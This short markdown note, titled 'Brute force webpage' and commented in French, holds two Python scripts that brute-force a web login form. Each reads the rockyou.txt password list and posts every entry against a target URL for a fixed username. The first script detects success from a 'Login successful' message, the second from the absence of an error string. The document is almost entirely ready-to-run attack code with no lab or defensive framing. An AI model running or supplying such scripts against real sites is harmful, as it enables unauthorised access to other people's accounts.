# Brute force webpage 

```python
import requests 
target_url = "https://MyWebSite.com/"
username = "username"
wordlist_path = "rockyou.txt"
with open(wordlist_path) as wordlist_file:        # variable pour accéder aux données du fichier
    for password in wordlist_file:
        password = password.strip()               # supprime tous les caractères indésirables ex les espaces 
        data = {"username": username, "password": password}
        response = requests.post(target_url, data=data)
        if "Login successful" in response.text:
            print(f"Success: username='{username}', password='{password}'")
            break
        else:
            print(f"Failed: username='{username}', password='{password}'")
```            
            
            
            ////////////////////////////////////////////////////////
 ```python           
import requests 
import re
target_url = "https://......../"
username = "username"
wordlist_path = "rockyou.txt"
with open(wordlist_path) as wordlist_file:        # variable pour accéder aux données du fichier
    for password in wordlist_file:
        password = password.strip()               # supprime tous les caractères indésirables ex les espaces 
        data = {"username": username, "password": password}
        response = requests.post(target_url, data=data)
        reg = re.findall("SERIOUS", response.text) #voir message d'erreur du site
        print(reg)
        if len(reg)<1:
            print(f"Success: username='{username}', password='{password}'")
            
            break
        else:
            print(f"Failed: username='{username}', password='{password}'")
```
